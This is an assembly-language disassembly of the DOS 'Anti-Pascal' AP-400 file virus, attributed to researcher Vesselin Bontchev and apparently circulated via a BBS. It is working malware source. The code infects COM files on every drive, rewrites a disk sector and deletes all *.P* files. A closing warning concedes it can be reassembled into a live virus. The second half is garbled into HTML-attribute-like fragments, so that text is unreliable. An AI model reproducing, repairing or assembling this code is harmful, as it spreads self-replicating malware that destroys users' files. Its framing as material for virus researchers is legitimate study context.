﻿

        page    ,132
        name    AP400
        title   The 'Anti-Pascal' virus, version AP-400
        .radix  16

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 º
; º  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        º
; º                                                                          º
; º                    The 'Anti-Pascal' Virus, version AP-400               º
; º                 Disassembled by Vesselin Bontchev, July 1990             º
; º                                                                          º
; º                  Copyright (c) Vesselin Bontchev 1989, 1990              º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
        assume  cs:code, ds:code

        org     100

v_const =       2042d

start:
        jmp     v_entry
        db      0CA             ; Virus signature

        db      (2048d - 9) dup (90)    ; The original "program"

        mov     ax,4C00         ; Just exit
        int     21

v_start label   byte
first4  db      0E9, 0F8, 7, 90
allcom  db      '*.COM', 0

mydta   label   byte
reserve db      15 dup (?)
attrib  db      ?
time    dw      ?
date    dw      ?
fsize   dd      ?
namez   db      14d dup (?)

allp    db      0, '?????????A?'
maxdrv  db      ?
sign    db      'PAD'

v_entry:
        push    ax              ; Save AX & DX
        push    dx

        mov     ah,19           ; Get the default drive
        int     21
        push    ax              ; Save it on stack
        mov     ah,0E           ; Set it as default (?!)
        mov     dl,al
        int     21              ; Do it

        call    self            ; Determine the virus' start address
self:
        pop     si
        sub     si,offset self-v_const

; Save the number of logical drives in the system:

        mov     byte ptr [si+offset maxdrv-v_const],al

; Restore the first 4 bytes of the infected program:

        mov     ax,[si+offset first4-v_const]
        mov     word ptr ds:[offset start],ax
        mov     ax,[si+offset first4+2-v_const]
        mov     word ptr ds:[offset start+2],ax

        mov     ah,1A           ; Set new DTA
        lea     dx,[si+offset mydta-v_const]
        int     21              ; Do it

        pop     ax              ; Restore current drive in AL
        push    ax              ; Keep it on stack

        call    inf_drive       ; Proceed with the current drive

        xor     al,al           ; For all logical drives in the system
drv_lp:
        call    inf_drive       ; Proceed with drive
        jbe     drv_lp          ; Loop until no more drives

        pop     ax              ; Restore the saved current drive
        mov     ah,0E           ; Set it as current drive
        mov     dl,al
        int     21              ; Do it

        mov     dx,80           ; Restore original DTA
        mov     ah,1A
        int     21              ; Do it

        mov     si,offset start
        pop     dx              ; Restore DX & AX
        pop     ax
        jmp     si              ; Run the original program

inf_drive:
        push    ax              ; Save the selected drive number on stack
        mov     ah,0E           ; Select that drive
        mov     dl,al
        int     21              ; Do ti
        pop     ax              ; Restore AX

        push    ax              ; Save the registers used
        push    bx
        push    cx
        push    si              ; Save SI

        mov     cx,1            ; Read sector #50 of the drive specified
        mov     dx,50d
        lea     bx,[si+offset v_end-v_const]
        push    ax              ; Save AX
        push    bx              ; Save BX, CX & DX also
        push    cx
        push    dx
        int     25              ; Do read
        pop     dx              ; Clear the stack
        pop     dx              ; Restore saved DX, CX & BX
        pop     cx
        pop     bx
        jnc     wr_drive        ; Write the information back if no error

        pop     ax              ; Restore AX
        pop     si              ; Restore SI

drv_xit:
        pop     cx              ; Restore used registers
        pop     bx
        pop     ax

        inc     al              ; Go to next drive number
        cmp     al,[si+offset maxdrv-v_const]   ; See if there are more drives
xit:
        ret                     ; Exit

wr_drive:
        pop     ax              ; Restore drive number in AL
        int     26              ; Do write
        pop     ax              ; Clear the stack
        pop     si              ; Restore Si
        jnc     cont            ; Continue if no error
        clc
        jmp     drv_xit         ; Otherwise exit

; Find first COM file on the current directory of the selected drive:

cont:
        mov     ah,4E
        xor     cx,cx           ; Normal files only
        lea     dx,[si+offset allcom-v_const]   ; File mask
next:
        int     21              ; Do find
        jc      no_more         ; Quit search if no more such files
        lea     dx,[si+offset namez-v_const]    ; Get file name found
        call    infect          ; Infect that file
        mov     ah,4F           ; Prepare for FindNext
        jc      next            ; If infection not successful, go to next file
        jmp     drv_xit         ; Otherwise quit

no_more:
        mov     ah,13           ; Delete all *.P* files in that dir
        lea     dx,[si+offset allp-v_const]
        int     21              ; Do it
        clc
        jmp     drv_xit         ; Done. Exit

namaddr dw      ?               ; Address of the file name buffer

infect:
        mov     [si+offset namaddr-v_const],dx  ; Save file name address

        mov     ax,4301         ; Reset all file attributes
        xor     cx,cx
        int     21              ; Do it
        jc      xit             ; Exit on error

        mov     ax,3D02         ; Open file for both reading and writing
        int     21
        jc      xit             ; Exit on arror
        mov     bx,ax           ; Save file handle in BX

        mov     cx,4            ; Read the first 4 bytes of the file
        mov     ah,3F
        lea     di,[si+offset first4-v_const]   ; Save them in first4
        mov     dx,di
        int     21              ; Do it
        jc      quit            ; Exit on error

        cmp     byte ptr [di+3],0CA     ; File already infected?
        stc                     ; Set CF to indicate it
        jz      quit            ; Don't touch this file if so

        mov     cx,[si+offset fsize-v_const]
        cmp     cx,2048d        ; Check if file size >= 2048 bytes
        jb      quit            ; Exit if not
        cmp     cx,64000d       ; Check if file size <= 64000="" bytes="" stc="" ;="" set="" cf="" to="" indicate="" it="" ja="" quit="" ;="" exit="" if="" not="" xor="" cx,cx="" ;="" seek="" to="" file="" end="" xor="" dx,dx="" mov="" ax,4202="" int="" 21="" ;="" do="" it="" push="" ax="" ;="" save="" file="" size="" on="" stack="" jc="" quit="" ;="" exit="" on="" error="" ;="" write="" the="" virus="" body="" after="" the="" end="" of="" file:="" mov="" cx,v_end-v_start="" nop="" lea="" dx,[si+offset="" v_start-v_const]="" mov="" ah,40="" int="" 21="" ;="" do="" it="" jc="" quit="" ;="" exit="" on="" error="" pop="" ax="" ;="" restore="" file="" size="" in="" ax="" ;="" form="" a="" new="" address="" for="" the="" first="" jmp="" instruction="" in="" ax:="" add="" ax,v_entry-v_start-3="" mov="" byte="" ptr="" [di],0e9="" ;="" jmp="" opcode="" mov="" [di+1],ax="" mov="" byte="" ptr="" [di+3],0ca="" ;="" set="" the="" "file="" infected"="" sign="" xor="" cx,cx="" ;="" seek="" to="" file="" beginning="" xor="" dx,dx="" mov="" ax,4200="" int="" 21="" ;="" do="" it="" jc="" quit="" ;="" exit="" on="" error="" mov="" cx,4="" ;="" write="" the="" new="" first="" 4="" bytes="" of="" the="" file="" mov="" dx,di="" mov="" ah,40="" int="" 21="" ;="" do="" it="" quit:="" pushf="" ;="" save="" flags="" mov="" ax,5701="" ;="" set="" file="" date="" &="" time="" mov="" cx,[si+offset="" time-v_const]="" ;="" get="" time="" from="" mydta="" mov="" dx,[si+offset="" date-v_const]="" ;="" get="" date="" from="" mydta="" int="" 21="" ;="" do="" it="" mov="" ah,3e="" ;="" close="" the="" file="" int="" 21="" mov="" ax,4301="" ;="" set="" file="" attributes="" mov="" cl,[si+offset="" attrib-v_const]="" ;="" get="" them="" from="" mydta="" xor="" ch,ch="" mov="" dx,[si+offset="" namaddr-v_const]="" ;="" point="" to="" file="" name="" int="" 21="" ;="" do="" it="" popf="" ;="" restore="" flags="" ret="" v_end="" equ="" $="" code="" ends="" end="" start="" ;****************************************************************************;="" ;="" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" for="" all="" your="" h/p/a/v="" files="" [="-" ;="" ;="" -="]" sysop:="" peter="" venkman="" [="-" ;="" ;="" -="]" [="-" ;="" ;="" -="]" +31.(o)79.426o79="" [="-" ;="" ;="" -="]" p="" e="" r="" f="" e="" c="" t="" c="" r="" i="" m="" e="" [="-" ;="" ;="" -="][][][][][][][][][][][][][][][=-" ;="" ;="" ;="" ;="" ***="" not="" for="" general="" distribution="" ***="" ;="" ;="" ;="" ;="" this="" file="" is="" for="" the="" purpose="" of="" virus="" study="" only!="" it="" should="" not="" be="" passed="" ;="" ;="" around="" among="" the="" general="" public.="" it="" will="" be="" very="" useful="" for="" learning="" how="" ;="" ;="" viruses="" work="" and="" propagate.="" but="" anybody="" with="" access="" to="" an="" assembler="" can="" ;="" ;="" turn="" it="" into="" a="" working="" virus="" and="" anybody="" with="" a="" bit="" of="" assembly="" coding="" ;="" ;="" experience="" can="" turn="" it="" into="" a="" far="" more="" malevolent="" program="" than="" it="" already="" ;="" ;="" is.="" keep="" this="" code="" in="" responsible="" hands!="" ;="" ;="" ;="" ;****************************************************************************;=""></=>